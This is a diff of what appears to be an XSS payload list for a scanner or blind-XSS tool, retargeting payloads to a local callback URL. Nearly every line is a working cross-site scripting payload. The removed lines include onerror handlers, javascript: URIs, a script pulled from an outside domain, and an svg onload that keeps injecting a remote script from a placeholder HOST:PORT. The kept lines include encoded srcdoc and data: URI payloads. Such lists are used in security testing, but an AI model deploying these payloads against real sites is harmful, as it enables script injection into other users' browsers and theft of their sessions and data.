@@ -8,20 +8,9 @@
 <embed src='http://127.0.0.1:8000/xss/{}/{}'>
 <frame src='http://127.0.0.1:8000/xss/{}/{}'>
 <form action="http://127.0.0.1:8000/xss/{}/{}" method="post"><input type="submit" id="a" value=click></form>
-<image/src/onerror=prompt(8)>
-<img/src/onerror=prompt(8)>
-<image src/onerror=prompt(8)>
-<img src/onerror=prompt(8)>
-<image src =q onerror=prompt(8)>
-<img src =q onerror=prompt(8)>
-</scrip</script>t><img src =q onerror=prompt(8)>
-<script src=//brutelogic.com.br/1.js> 
-<script src=//3334957647/1>
-<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
-<script src=javascript:alert(1)> 
-<iframe src=javascript:alert(1)> 
-<embed src=javascript:alert(1)> 
-<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+</scrip</script>t><img src ="http://127.0.0.1:8000/xss/{}/{}">
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src="http://127.0.0.1:8000/xss/{}/{}"},0)>
+<form><input formaction="http://127.0.0.1:8000/xss/{}/{}" type=image src=SOURCE> 
 <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
 "><img src=1 onerror=alert(1)>.gif
 <script src="data:&comma;alert(1)//
